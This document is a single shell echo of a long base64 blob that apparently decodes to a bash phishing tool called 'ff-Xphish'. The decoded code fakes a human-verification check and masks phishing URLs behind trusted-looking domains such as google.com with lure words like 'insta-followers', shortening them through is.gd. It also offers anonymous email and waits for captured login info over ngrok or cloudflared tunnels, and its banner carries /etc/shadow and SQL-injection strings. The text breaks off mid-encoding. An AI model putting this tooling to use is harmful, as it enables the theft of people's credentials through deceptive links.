echo "IyEvYmluL2Jhc2gKbm93PSIkKGRhdGUpIgpwcmludGYgIiVzXG4iCm5vdz0iJChkYXRlICsnJWQvJW0vJVknKSIKCm09IiQoZGF0ZSkiCgptPSIkKGRhdGUgKyclSDolTTolUycpIgoKbnVsbD0ifj4gL2Rldi9udWxsIDI+JjEiCmc9IlwwMzNbMTszMm0iCnI9IlwwMzNbMTszMW0iCmI9IlwwMzNbMTszNG0iCmk9IlwwMzNbMzNtIgpQPSJcMDMzWzM1bSIKdz0iXDAzM1swbSIJCkI9IlxlWzE7NDBtIgpNPSJcZVsxOzQ1bSIKQz0iXGVbMTs0Nm0iCkI9IlxlWzE7NDBtIgp3PSJcMDMzWzBtIgpaPSJcMDMzWzQ7MzFtIgpLPSJcMDMzWzA7MTAwbSIKRD0iXDAzM1s0OzMxbSIKRz0iXDAzM1sxOzk2bSIKVz0iXGVbMTswbSIKTEc9IlwwMzNbMTszMG0iCkdMPSJcMDMzWzE7MzNtIgpDQT0iXDAzM1sxOzA7MzZtIgpCTz0iXDAzM1sxOzA7MzNtIgpDMT0iXDAzM1sxOzkybSIKTEM9IlwwMzNbMDszN20iCgoKZ2VudCgpIHsKZWNobyAiIgpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzM2bSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szMm0gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzNtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzMxbSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szNW0gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMTszNm0gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzZtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzMybSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szM20gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzFtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzM1bSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1sxOzM2bSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szNm0gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzJtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzMzbSBHZW5lcmF0aW5nIExpbmsuLi4iCnNsZWVwIDAuMTcKcHJpbnRmICJcclxlWzkxbVtcZVs5Mm0rXGVbOTFtXVxlWzE7OTNtXDAzM1szMW0gR2VuZXJhdGluZyBMaW5rLi4uIgpzbGVlcCAwLjE3CnByaW50ZiAiXHJcZVs5MW1bXGVbOTJtK1xlWzkxbV1cZVsxOzkzbVwwMzNbMzVtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwpwcmludGYgIlxyXGVbOTFtW1xlWzkybStcZVs5MW1dXGVbMTs5M21cMDMzWzE7MzZtIEdlbmVyYXRpbmcgTGluay4uLiIKc2xlZXAgMC4xNwoKCmVjaG8gIiIKfQoKCiAgICBzbGVlcCAwLjIwCiAgICAjIEZyYW1lICMyCiAgICBwcmludGYgIlxyU3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc1RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RBcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhUnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhclRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRJbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpTmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbkcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgRmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZkYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYtWHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteFBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBIaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoSXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaVNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNIIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIFBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBMZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsRWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZUFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFTZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzRSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSBXYWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3QWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YUl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWlULi4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyU3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc1RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RBcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhUnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhclRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRJbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpTmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbkcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgRmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZkYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYtWHBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteFBoaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBIaXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoSXNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaVNoIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNIIHBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIFBsZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBMZWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsRWFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZUFzZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFTZSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzRSB3YWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSBXYWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3QWl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YUl0Li4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyc3RhcnRpbmcgZmYteHBoaXNoIHBsZWFzZSB3YWlULi4iCiAgICBzbGVlcCAwLjIwCiAgICBwcmludGYgIlxyIC4iCgoKaWYgW1sgLWQgLnNpdGVzIF1dOyB0aGVuCgllY2hvICIiCmVsc2UKCWVjaG8gLWUgJEciRmlyc3QgUnVuIFRoaXMgQ29tbWFuZCAkZyBiYXNoIHNldHVwLnNoIgoJZXhpdApmaQoKCgpkeW5hbWljX2FycmF5PSgpCgpmb3IgKCggaSA9MSA7IGk8PTIgOyBpKyspKQp7CiAgICBzdG9yZV9kaWdpdD0kKHNodWYgLWkwLTkgLW4xKSA7IGR5bmFtaWNfYXJyYXkrPSgiJHN0b3JlX2RpZ2l0IikKfQpzdHJfYXJyYXlfdmFsdWU9IiR7ZHluYW1pY19hcnJheVsqXX0iIDsKCm90cDE9JHtzdHJfYXJyYXlfdmFsdWUvLyAvfQoKZHluYW1pY19hcnJheT0oKQoKZm9yICgoIGkgPTEgOyBpPD0yIDsgaSsrKSkKewogICAgc3RvcmVfZGlnaXQ9JChzaHVmIC1pMC05IC1uMSkgOyBkeW5hbWljX2FycmF5Kz0oIiRzdG9yZV9kaWdpdCIpCn0Kc3RyX2FycmF5X3ZhbHVlPSIke2R5bmFtaWNfYXJyYXlbKl19IiA7CgpvdHAyPSR7c3RyX2FycmF5X3ZhbHVlLy8gL30KCkE9IiRvdHAxIgpCPSIkb3RwMiIKZWNobyAtZSAkUCJIdW1hbiBWZXJpZmljYXRpb24iJHcKZWNobyAiIgplY2hvICJhPSRBIjsgCmVjaG8gImI9JEIiOyAKZWNobyAiIgpjaGsyKCkgewppZiBbICRBIFw+ICRCIF07IHRoZW4gZWNobyAiYSBpcyBncmVhdGVyIHRoYW4gYiI7IGVsc2UgZWNobyAiYiBpcyBncmVhdGVyIHRoYW4gYSI7IGV4aXQ7IGZpOwp9CmNoazMoKSB7CmlmIFsgJEIgXD4gJEEgXTsgdGhlbiBlY2hvICJhIGlzIGdyZWF0ZXIgdGhhbiBiIjsgZWxzZSBlY2hvICJiIGlzIGdyZWF0ZXIgdGhhbiBhIjsgZXhpdDsgIGZpOwp9CnJlYWQgLXAgIlNheSBUaGUgQW5zd2VyIFdoaWNoIElzIEdyZWF0ZXIgOiIgcXMKY2FzZSAkcXMgaW4KCWEpCgkJY2hrMjs7CiAgICAgICAgYikKCQljaGszOzsKCSopCgkJZWNobyAiaW52YWxpZCBPcHRpb24iCgkJZXhpdAplc2FjCgoKCgojIyAgIGZmLVhwaGlzaCAJOiAJQXV0b21hdGVkIFBoaXNoaW5nIFRvb2wKIyMgICBBdXRob3IgCTogCUhhc2FuZnEgCiMjICAgVmVyc2lvbiAJOiAJMy4wCiMjICAgR2l0aHViIAk6IAlodHRwczovL2dpdGh1Yi5jb20va21waGlzaGVyCgojIyBBTlNJIGNvbG9ycyAoRkcgJiBCRykKUkVEPSIkKHByaW50ZiAnXDAzM1szMW0nKSIgIEdSRUVOPSIkKHByaW50ZiAnXDAzM1szMm0nKSIgIE9SQU5HRT0iJChwcmludGYgJ1wwMzNbMzNtJykiICBCTFVFPSIkKHByaW50ZiAnXDAzM1szNG0nKSIKTUFHRU5UQT0iJChwcmludGYgJ1wwMzNbMzVtJykiICBDWUFOPSIkKHByaW50ZiAnXDAzM1szNm0nKSIgIFdISVRFPSIkKHByaW50ZiAnXDAzM1szN20nKSIgQkxBQ0s9IiQocHJpbnRmICdcMDMzWzMwbScpIgpSRURCRz0iJChwcmludGYgJ1wwMzNbNDFtJykiICBHUkVFTkJHPSIkKHByaW50ZiAnXDAzM1s0Mm0nKSIgIE9SQU5HRUJHPSIkKHByaW50ZiAnXDAzM1s0M20nKSIgIEJMVUVCRz0iJChwcmludGYgJ1wwMzNbNDRtJykiCk1BR0VOVEFCRz0iJChwcmludGYgJ1wwMzNbNDVtJykiICBDWUFOQkc9IiQocHJpbnRmICdcMDMzWzQ2bScpIiAgV0hJVEVCRz0iJChwcmludGYgJ1wwMzNbNDdtJykiIEJMQUNLQkc9IiQocHJpbnRmICdcMDMzWzQwbScpIgpSRVNFVEJHPSIkKHByaW50ZiAnXGVbMG1cbicpIiAgRz0iJChwcmludGYgJ1wwMzNbMTs5Nm0nKSIgZz0iJChwcmludGYgJ1wwMzNbMTszMm0nKSIgQj0iJChwcmludGYgJ1xlWzE7NDBtJykiCmk9IiQocHJpbnRmICdcMDMzWzMzbScpIiBMRz0iJChwcmludGYgJ1wwMzNbMTszMG0nKSIgR0w9IiQocHJpbnRmICdcMDMzWzE7MzNtJykiCmI9IiQocHJpbnRmICdcMDMzWzE7MzRtJykiIEcxPSIkKHByaW50ZiAnXDAzM1sxOzkybScpIiBCTz0iJChwcmludGYgJ1wwMzNbMTswOzMzbScpIgoKIyMgbWFzayB1cmwKbWFza3VybCgpIHsKdXJsX2NoZWNrZXIoKSB7CiAgICBpZiBbICEgIiR7MS8vOip9IiA9IGh0dHAgXTsgdGhlbgogICAgICAgIGlmIFsgISAiJHsxLy86Kn0iID0gaHR0cHMgXTsgdGhlbgogICAgICAgICAgICBlY2hvIC1lICIkclshXSBJbnZhbGlkIFVSTC4gUGxlYXNl
IHVzZSBodHRwIG9yIGh0dHBzLiR3IgogICAgICAgICAgICBjYXB0dXJlX2RhdGEKICAgICAgICBmaQogICAgZmkKfQoKZWNobyAtbiAiUGFzdGUgVVJMIGhlcmUgOiAkZyAiCnJlYWQgcGhpc2gKdXJsX2NoZWNrZXIgJHBoaXNoCnNsZWVwIDEKZWNobyAiIgplY2hvIC1lICRHIlByb2Nlc3NpbmcgYW5kIE1vZGlmaW5nIFBoaXNoaW5nIFVSTCIKZWNobyAiIgpzaG9ydD0kKGN1cmwgLXMgaHR0cHM6Ly9pcy5nZC9jcmVhdGUucGhwXD9mb3JtYXRcPXNpbXBsZVwmdXJsXD0ke3BoaXNofSkKc2hvcnRlcj0ke3Nob3J0I2h0dHBzOi8vfQplY2hvIC1lICJcblxlJGcgIyMjIE1hc2tpbmcgRG9tYWluICMjI1xlWzBtIgplY2hvICdEb21haW4gdG8gbWFzayB0aGUgUGhpc2hpbmcgVVJMICh3aXRoIGh0dHAgb3IgaHR0cHMpLGV4OiBodHRwczovL2dvb2dsZS5jb20gOicKZWNobyAtZW4gIiRiPT5cZVswbSAiCnJlYWQgbWFzawp1cmxfY2hlY2tlciAkbWFzawplY2hvICIiCmVjaG8gLWUgJyRpVHlwZSB0cmFwIHdvcmQ6KGZiLXNxIGZmLXJld2FyZCBpbnN0YS1mb2xsb3dlcnMgKScKZWNobyAtZSAiJHJEb24ndCB1c2Ugc3BhY2UganVzdCB1c2UgJy0nIGJldHdlZW4gdHJhcCB3b3Jkc1xlWzBtIgplY2hvIC1lbiAiJGI9PiR3ICIKcmVhZCB3b3JkcwppZiBbWyAteiAiJHdvcmRzIiBdXTsgdGhlbgplY2hvIC1lICIkclshXSBObyB3b3Jkcy4kdyIKZWNobyAtZSAiJGdHZW5lcmF0aW5nIHBoaXNoaW5nIExpbmsuLi4kdyIKZWNobyAiIgpmaW5hbD0kbWFza0Akc2hvcnRlcgplY2hvIC1lICRHIlsrXSBIZXJlIGlzIHRoZSBQaGlzaGluZyBVUkw6JGcgJHtmaW5hbH0gJHciJEcKZWNobyAiIgpmaQppZiBbWyAiJHdvcmRzIiA9fiAiICIgXV07IHRoZW4KZWNobyAtZSAiXGVbMzFtWyFdIEludmFsaWQgd29yZHMuIFBsZWFzZSBhdm9pZCBzcGFjZS4kdyIkRwplY2hvIC1lICJcbkdlbmVyYXRpbmcgUGhpc2hpbmcgTGluay4uLlxuIgpmaW5hbD0kbWFza0Akc2hvcnRlcgplY2hvIC1lICJIZXJlIGlzIHRoZSBQaGlzaGluZyBVUkw6JGcgJHtmaW5hbH0gJHciJEcKZWNobyAiIgpmaQplY2hvIC1lICJcbkdlbmVyYXRpbmcgUGhpc2hpbmcgTGluay4uLlxuIgpmaW5hbD0kbWFzay0kd29yZHNAJHNob3J0ZXIKZWNobyAtZSAiSGVyZSBpcyB0aGUgUGhpc2hpbmcgVVJMOiRnICR7ZmluYWx9ICR3IiRHCmVjaG8gIiIKCnJlYWQgLXAgIkRvIHdhbnQgc2VuZCBFLW1haWwgYW5vbnltb3VzbHkgKHkvbikgIiB5bgogICAgY2FzZSAkeW4gaW4KICAgICAgICBbWXldKiApIAogICAgICAgICAgICAgICAgbWFpbGVyCgkJZWNobyAtbmUgIlxuJHtMR31bJHtHTH0tJHtMR31dJHtCT30gV2FpdGluZyBmb3IgTG9naW4gSW5mbywgJHtpfUN0cmwgKyBDICR7T1JBTkdFfXRvIGV4aXQuLi4iJExHCgkJOzsKCSBbTm5dKiApCiAgICAgICAgICAgICAgICBlY2hvICIiCgkJZWNobyAtbmUgIlxuJHtMR31bJHtHTH0tJHtMR31dJHtCT30gV2FpdGluZyBmb3IgTG9naW4gSW5mbywgJHtpfUN0cmwgKyBDICR7T1JBTkdFfXRvIGV4aXQuLi4iJExHCiAgICAgICAgICAgICAgICA7OwogICAgICAgICogKSBlY2hvICJQbGVhc2UgYW5zd2VyIHkgb3Igbi4iOzsKICAgIGVzYWMKCn0KCgojIyBEaXJlY3RvcmllcwppZiBbWyAhIC1kICIuc2VydmVyIiBdXTsgdGhlbgoJbWtkaXIgLXAgIi5zZXJ2ZXIiCmZpCmlmIFtbIC1kICIuc2VydmVyL3d3dyIgXV07IHRoZW4KCXJtIC1yZiAiLnNlcnZlci93d3ciCglta2RpciAtcCAiLnNlcnZlci93d3ciCmVsc2UKCW1rZGlyIC1wICIuc2VydmVyL3d3dyIKZmkKaWYgW1sgLWUgIi5jbGQubG9nIiBdXTsgdGhlbgoJcm0gLXJmICIuY2xkLmxvZyIKZmkKCiMjIFNjcmlwdCB0ZXJtaW5hdGlvbgpleGl0X29uX3NpZ25hbF9TSUdJTlQoKSB7CiAgICB7IHByaW50ZiAiXG5cbiVzXG5cbiIgIiR7TEd9WyR7R0x9ISR7TEd9XSR7TEd9IFByb2dyYW0gSW50ZXJydXB0ZWQuIiAyPiYxOyByZXNldF9jb2xvcjsgfQogICAgZXhpdCAwCn0KCmV4aXRfb25fc2lnbmFsX1NJR1RFUk0oKSB7CiAgICB7IHByaW50ZiAiXG5cbiVzXG5cbiIgIiR7TEd9WyR7R0x9ISR7TEd9XSR7TEd9IFByb2dyYW0gVGVybWluYXRlZC4iIDI+JjE7IHJlc2V0X2NvbG9yOyB9CiAgICBleGl0IDAKfQoKdHJhcCBleGl0X29uX3NpZ25hbF9TSUdJTlQgU0lHSU5UCnRyYXAgZXhpdF9vbl9zaWduYWxfU0lHVEVSTSBTSUdURVJNCgojIyBSZXNldCB0ZXJtaW5hbCBjb2xvcnMKcmVzZXRfY29sb3IoKSB7Cgl0cHV0IHNncjAgICAjIHJlc2V0IGF0dHJpYnV0ZXMKCXRwdXQgb3AgICAgICMgcmVzZXQgY29sb3IKICAgICAgICByZXR1cm4KfQoKIyMgS2lsbCBhbHJlYWR5IHJ1bm5pbmcgcHJvY2VzcwpraWxsX3BpZCgpIHsKCWlmIFtbIGBwaWRvZiBwaHBgIF1dOyB0aGVuCgkJa2lsbGFsbCBwaHAgPiAvZGV2L251bGwgMj4mMQoJZmkKCWlmIFtbIGBwaWRvZiBuZ3Jva2AgXV07IHRoZW4KCQlraWxsYWxsIG5ncm9rID4gL2Rldi9udWxsIDI+JjEKCWZpCglpZiBbWyBgcGlkb2YgY2xvdWRmbGFyZWRgIF1dOyB0aGVuCgkJa2lsbGFsbCBjbG91ZGZsYXJlZCA+IC9kZXYvbnVsbCAyPiYxCglmaQp9CgojIyBCYW5uZXIKYmFubmVyKCkgewplY2hvICIK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICAgICAgICAgICBGRi1YUEhJU0ggICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICBBdXRob3I6ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgaHR0cHM6Ly9naXRodWIuY29tL2thbWFuYXRpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEJCQkJCQkJCeKVkQrilZEgIFRoZSBhdXRob3Igb2YgdGhpcyBwcm9ncmFtIGlzIG5vdCByZXNwb25zaWJsZSBmb3IgaXRzIHVzZSEgICDilZEgICAgIArilZEgIFdoZW4gcG9zdGluZyB0aGlzIGNvZGUgb24gb3RoZXIgcmVzb3VyY2VzLCAgICAgICAgICAgICAgICAgICDilZEK4pWRICBwbGVhc2UgaW5kaWNhdGUgdGhlIGF1dGhvciEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkQkJCQkJCQkJ4pWRCuKVkSAgICAgICAgICAgICAgQWxsIHJpZ2h0cyByZXNlcnZlZC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgIENvcHlyaWdodCDCqe+4jyAgMjAyMiBrYW1hbmF0aSAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRIArilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIgplY2hvICIiCgoKfQoKIyMgU21hbGwgQmFubmVyCmJhbm5lcl9zbWFsbCgpIHsKCiAgZWNobyAtZSAkciAiICAgICAgICAgICAgICAgICAgICAgICAgOW9ERm8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiCiAgZWNobyAtZSAkciAiICAgICAgICAgICAgICAgICAgICAgIDc4eW1NMGRheU1teTVsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiCiAgZWNobyAtZSAkciAiICAgICAgICAgICAgICAgICAgLStkSEo1YUdGeVpHVnlJUT09Ky0gICAgICAgICAgICAgICAgICAgICAgICAgICAiCiAgZWNobyAtZSAkciAiICAgICAgICAgICAgICAgLTpzbeKPo35+RGVzdHJveS5Oby5EYXRhfn5zOi0gICAgICAgICAgICAgICAgICAgICAgICIKICBlY2hvIC1lICRyICIgICAgICAgICAgICAgLStoMn5+TWFpbnRhaW4uTm8uUGVyc2lzdGVuY2V+fmgrLSAgICAgICAgICAgICAgICAgICIKICBlY2hvIC1lICRyICIgICAgICAgICAtOm9kTm8yfn5BYm92ZS5BbGwuRWxzZS5Eby5Oby5IYXJtfn5OZG86LSAgICAgICAgICAgICAgICIKICBlY2hvIC1lICRyICIgICAgICAtL2V0Yy9zaGFkb3cuMGRheXMtRGF0YWIlMjBPUiUyMDE9MS0tLk5vLjBNTjgnLy0gICAgICAgICAgICIKICBlY2hvIC1lICRyICIgICAtKytTZWNLQ29pbisrZS5BTWQgICAgICAgICAuLTovLy8vLytoYm92ZS45MTMuRW